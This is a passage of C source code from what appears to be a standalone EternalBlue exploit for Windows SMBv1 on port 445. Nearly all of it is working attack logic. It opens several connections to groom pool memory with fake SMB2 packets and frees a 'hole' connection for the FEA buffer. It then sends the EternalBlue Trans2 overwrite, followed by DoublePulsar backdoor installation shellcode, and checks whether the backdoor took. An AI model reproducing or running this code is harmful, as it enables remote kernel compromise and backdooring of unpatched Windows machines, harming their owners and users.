		transrespentry = transrespentry->Flink;

		set_datadisplacement(&info, get_datadisplacement(&info) + transentry->Blink->transaction.nttrans->DataCount);
		
		for (i = 0; i < 15; i++)
		{
			bstatus = SendRecvTrans2SecondaryFidZero(req, resp, GetSocket(s + socketindex), &info);
			++smbrequestandresponsecount;

			update_smb_info(&info, &req->ThisPacket);
			//update_smb_info(&info, &resp->ThisPacket);

			if (!bstatus)
				break;

			FillInTransactionRequestListEntry(transentry, req);
			
			req = req->NextEntry;
			resp = resp->NextEntry;
			transentry = transentry->Flink;
			transrespentry = transrespentry->Flink;

			set_datadisplacement(&info, get_datadisplacement(&info) + transentry->Blink->transaction.trans2secondary->DataCount);
		}
		
		bstatus = SendRecvEcho(req, resp, GetSocket(s + socketindex), &info);
		++smbrequestandresponsecount;

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (!bstatus)
			break;

		if (GetUlong(&resp->ThisSmb->Status.NtStatus) != NT_STATUS_SUCCESS)
			break;

		req = req->NextEntry;
		resp = resp->NextEntry;



		++socketindex;
		sessionsetupinfo->connection_handle += (random() % 0x1000);
		sessionsetupinfo->sockaddrpointer = sa + 1;
		sessionsetupinfo->socketpointer = s + socketindex;
		sessionsetupinfo->wsapointer = &wsa;
		allocconnection = s + socketindex;

		//create second connection for sessionsetup bug allocation
		PutUnsigned(status, TargetConnect(GetSocket(s + socketindex), sa[1], wsa, ip.Buffer, GetUnsigned(status + 1)));

		if (GetUlong(status) != 0)
		{
			--socketindex;
			PutUlong(status, WSAGetLastError());
			errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
			dbgprint("[%S]: failed to connect to target %S:%u with wserror 0x%08X and status 0x%08X\n", __FUNCTION__, ip.Buffer, 445, MAKEUNSIGNED(WSAGetLastError()), GetUnsigned(status));
			break;
		}

		set_datadisplacement(sessionsetupinfo, 0);
		set_pid(sessionsetupinfo, 65279);
		set_mid(sessionsetupinfo, 64);
		set_uid(sessionsetupinfo, 0);
		set_tid(sessionsetupinfo, 0);

		bstatus = SendRecvNegotiate(req, resp, GetSocket(s + socketindex), sessionsetupinfo);
		++smbrequestandresponsecount;
		
		update_smb_info(sessionsetupinfo, &req->ThisPacket);
		update_smb_info(sessionsetupinfo, &resp->ThisPacket);

		if (!bstatus)
			break;

		if (GetUlong(&resp->ThisSmb->Status.NtStatus) != 0)
			break;

		req = req->NextEntry;
		resp = resp->NextEntry;

		bstatus = SendRecvSessionSetupTypeTwo(req, resp, GetSocket(s + socketindex), &info);
		++smbrequestandresponsecount;

		update_smb_info(sessionsetupinfo, &req->ThisPacket);
		update_smb_info(sessionsetupinfo, &resp->ThisPacket);
		
		if (!bstatus)
			break;

		if (GetUlong(&resp->ThisSmb->Status.NtStatus) != 0)
			break;

		req = req->NextEntry;
		resp = resp->NextEntry;

		for (i = 0; i < groomcount; i++)
		{
			++socketindex;
			PutUnsigned(status, TargetConnect(GetSocket(s + socketindex), *sa, wsa, ip.Buffer, GetUnsigned(status + 1)));
		
			if (GetUlong(status) != 0)
			{
				PutUlong(status, WSAGetLastError());
				errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
				dbgprint("[%S]: failed to connect to target %S:%u with wserror 0x%08X and status 0x%08X\n", __FUNCTION__, ip.Buffer, 445, MAKEUNSIGNED(WSAGetLastError()), GetUnsigned(status));
				break;
			}

			bstatus = SendRecvGroomFakeSmb2(req, resp, GetSocket(s + socketindex), &info);
			++smbrequestandresponsecount;

			req = req->NextEntry;
			resp = resp->NextEntry;
		}

		++socketindex;
		sessionsetupinfo[1].connection_handle += (random() % 0x1000);
		sessionsetupinfo[1].sockaddrpointer = (sa + 1);
		sessionsetupinfo[1].socketpointer = s + socketindex;
		sessionsetupinfo[1].wsapointer = &wsa;

		PutUnsigned(status, TargetConnect(GetSocket(s + socketindex), sa[1], wsa, ip.Buffer, GetUnsigned(status + 1)));

		if (GetUlong(status) != 0)
		{
			--socketindex;
			PutUlong(status, WSAGetLastError());
			errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
			dbgprint("[%S]: failed to connect to target %S:%u with wserror 0x%08X and status 0x%08X\n", __FUNCTION__, ip.Buffer, 445, MAKEUNSIGNED(WSAGetLastError()), GetUnsigned(status));
			break;
		}

		set_datadisplacement(sessionsetupinfo + 1, 0);
		set_pid(sessionsetupinfo + 1, 65279);
		set_mid(sessionsetupinfo + 1, 64);
		set_uid(sessionsetupinfo + 1, 0);
		set_tid(sessionsetupinfo + 1, 0);

		holeconnection = s + socketindex;

		bstatus = SendRecvNegotiate(req, resp, GetSocket(holeconnection), sessionsetupinfo + 1);
		++smbrequestandresponsecount;

		update_smb_info(sessionsetupinfo + 1, &req->ThisPacket);
		update_smb_info(sessionsetupinfo + 1, &resp->ThisPacket);

		if (!bstatus)
			break;

		if (GetUlong(&resp->ThisSmb->Status.NtStatus) != 0)
			break;

		req = req->NextEntry;
		resp = resp->NextEntry;


		bstatus = SendRecvSessionSetupTypeThree(req, resp, GetSocket(holeconnection), sessionsetupinfo + 1);
		++smbrequestandresponsecount;

		update_smb_info(sessionsetupinfo + 1, &req->ThisPacket);
		update_smb_info(sessionsetupinfo + 1, &resp->ThisPacket);

		if (!bstatus)
			break;

		if (GetUlong(&resp->ThisSmb->Status.NtStatus) != 0)
			break;
	
		req = req->NextEntry;
		resp = resp->NextEntry;

		//next step in the exploit is to close the "alloc" connection (first nt session setup connection)
		if (isnull(allocconnection))
			break;
		else if (!(GetSocket(allocconnection)))
			break;
		closesocket(GetSocket(allocconnection));
		PutSocket(allocconnection, 0);

		++socketindex;
		srvnetconnections = (s + socketindex);
		--socketindex;
		for (i = 0; i < 5; i++)
		{
			++socketindex;
			
			PutUnsigned(status, TargetConnect(GetSocket(s + socketindex), sa[1], wsa, ip.Buffer, GetUnsigned(status + 1)));

			if (GetUlong(status) != 0)
			{
				PutUnsigned(status, MAKEUNSIGNED(WSAGetLastError()));
				break;
			}

			bstatus = SendRecvGroomFakeSmb2(req, resp, GetSocket(s + socketindex), &info);
			++smbrequestandresponsecount;

			if (!bstatus)
				break;

			req = req->NextEntry;
			resp = resp->NextEntry;
		}

		//close holeconnection to create room for FEA buffer
		if (GetSocket(holeconnection))
			closesocket(GetSocket(holeconnection));

		bstatus = SendRecvTrans2SecondaryFidZeroEternalblueOverwrite(req, resp, GetSocket(info.socketpointer), &info);
		++smbrequestandresponsecount;

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (!bstatus)
			break;

		if (GetUlong(&resp->ThisSmb->Status.NtStatus) != STATUS_INVALID_PARAMETER)
		{
			PutUlong(status, GetUlong(&resp->ThisSmb->Status.NtStatus));
			dbgprint("[%S]: eternalblue overwrite failed recieved status 0x%08X instead of STATUS_INVALID_PARAMETER\n", __FUNCTION__, GetUnsigned(&resp->ThisSmb->Status.NtStatus));
			info.DoublePulsarInstalled = FALSE;
			break;
		}
		else 
		{
			_dbgprint("[%S]: good response 0x%08X from host %S:%u EternalBlue overwrite completed successfully...\n", __FUNCTION__, GetUnsigned(&resp->ThisSmb->Status.NtStatus), ip.Buffer, 445U);
		}
		
		for (i = 0; i < 5; i++)
		{
			bstatus = SendRecvDoublePulsarInstallationShellcode(req, resp, GetSocket(srvnetconnections + i), &info);
			++smbrequestandresponsecount;

			if (!bstatus)
				break;

			req = req->NextEntry;
			resp = resp->NextEntry;
		}

		for (i = 0; i < 5; i++)
		{
			if (GetSocket(srvnetconnections + i))
				closesocket(GetSocket(srvnetconnections + i));
		}
		break;
	} 

	//SMB Logoff
	do {

		if (req->ThisSmb != NULL || resp->ThisSmb != NULL)
		{
			req = req->NextEntry;
			resp = resp->NextEntry;
		}

		bstatus = SendRecvLogoffAndx(req, resp, GetSocket(s + 0), &info);
		++smbrequestandresponsecount;

		req = req->NextEntry;
		resp = resp->NextEntry;

		bstatus = SendRecvTreeDisconnect(req, resp, GetSocket(s + 0), &info);
		++smbrequestandresponsecount;
	} while (FALSE);

	
	
	if (info.DoublePulsarInstalled)
		PutUlong(status, 0);
	else
		PutUlong(status, 1);

	//close socket and cleanup
	for(i = 0; i < numberofsockets; i++)
		if (validsock(GetSocket(s + i)) && GetSocket(s + i))
			closesocket(GetSocket(s + i));

	(void)WSACleanup();

	//start at begining of lists
	req = requests;
	resp = responses;
	//free buffers
	FreeRequestLinkedListBuffers(req, &numberofreqentries);
	FreeResponseLinkedListBuffers(resp, &numberofrespentries);
	FreeUnicodeString(&wip);
	FreeUnicodeString(&info.tree_connection);
	FreeString(&info.tree_connect_andx_svc);
	FreeString(&ip);
	FreeTransactionRequestList(&transactionlist);
	FreeSockets(s);
	SmbLibraryRelease();
	return GetUlong(status);
}

#pragma warning(pop)